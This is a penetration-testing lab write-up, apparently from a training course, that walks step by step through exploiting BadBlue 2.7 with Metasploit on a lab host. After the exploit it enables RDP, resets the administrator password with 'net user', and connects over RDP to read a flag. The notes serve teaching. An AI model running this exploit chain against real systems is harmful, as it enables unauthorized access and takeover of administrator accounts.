# Windows: Enabling Remote Desktop (RDP)

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5110–5161. Examples are lab-specific and need verification.

Metasploit provides a large collection of exploits for various software vulnerabilities. These exploits can be used to gain unauthorized access to systems. It also consists of modules that help in maintaining control over compromised systems, collecting sensitive data, and escalating privileges. In this lab, we will explore a couple of modules to exploit a vulnerable application and gain an RDP session on the target.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.

Your task is to fingerprint the vulnerable application using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. Then, enable the target machine RDP service and access it using xfreerdp tool.

**Objective:** Your task is to find and exploit the vulnerable application and get the RDP session to find the flag!

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

Tools: nmap , msf, xfreerdp

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
#Note: The RDP default port is not exposed - 3389.
#We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.
nmap -sV -p 80 demo.ine.local
#We will search the exploit module for badblue 2.7 using searchsploit.
searchsploit badblue 2.7

msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
#We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
Background the session.

#Enabling the RDP service using windows post exploitation module.
use post/windows/manage/enable_rdp
set SESSION 1
exploit

#The post exploit worked fine. Re-running nmap to check if RDP port is exposed or not.
nmap demo.ine.local
#The RDP port 3389 is exposed.
# Interact with the meterpreter shell and change the administrator password.
sessions -i 1
shell
net user administrator hacker_123321
#Use hydra to check

#Connect to the RDP service using xfreerdp utility and administrator account.
xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local

Y

#Reading the flag.txt file which is present on the Desktop of the Administrator user.
```
